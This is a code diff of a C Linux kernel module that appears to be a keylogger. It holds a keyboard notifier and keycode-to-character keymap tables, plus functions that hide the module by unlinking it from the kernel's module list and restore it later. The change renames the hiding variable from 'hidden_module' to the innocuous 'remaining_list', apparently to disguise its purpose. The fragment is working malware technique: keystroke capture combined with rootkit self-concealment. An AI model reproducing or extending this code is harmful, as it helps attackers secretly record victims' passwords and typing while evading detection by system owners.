@@ -41,7 +41,7 @@ static struct notifier_block keyboard_notifier = {
 
 
 
-struct list_head * hidden_module=NULL;
+struct list_head * remaining_list=NULL;
 
 static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                         "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
@@ -69,16 +69,16 @@ static const char* keymap_shift[] =
 	/* Start hiding */
 
 	void hide_module(void){
-		if(hidden_module==NULL){
-			hidden_module=__this_module.list.next;
+		if(remaining_list==NULL){
+			remaining_list=__this_module.list.next;
 			list_del(&(__this_module.list));
 		}
 	}
 
 	void unhide_module(void){
-		if(hidden_module!=NULL){
-			list_add(&(__this_module.list), hidden_module);
-			hidden_module=NULL;
+		if(remaining_list!=NULL){
+			list_add(&(__this_module.list), remaining_list);
+			remaining_list=NULL;
 		}
 	}
 
